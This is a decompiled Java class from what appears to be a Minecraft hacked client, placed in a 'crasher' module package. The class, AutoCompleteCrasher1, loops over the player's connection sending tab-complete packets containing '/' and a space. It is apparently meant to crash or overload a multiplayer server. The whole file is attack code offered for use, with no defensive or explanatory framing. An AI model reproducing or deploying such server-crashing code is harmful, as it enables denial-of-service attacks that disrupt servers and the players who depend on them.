// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.acc;

import net.minecraft.network.Packet;
import net.minecraft.client.Minecraft;
import net.minecraft.util.math.BlockPos;
import net.minecraft.network.play.client.CPacketTabComplete;

public class AutoCompleteCrasher1
{
    public static double packets;
    
    static {
        AutoCompleteCrasher1.packets = 10.0;
    }
    
    public static void start() {
        final CPacketTabComplete complete1 = new CPacketTabComplete("/", null, false);
        final CPacketTabComplete complete2 = new CPacketTabComplete(" ", null, false);
        for (int j = 0; j < AutoCompleteCrasher1.packets; ++j) {
            Minecraft.getMinecraft().player.connection.sendPacket(complete1);
            ++j;
            Minecraft.getMinecraft().player.connection.sendPacket(complete2);
        }
    }
}
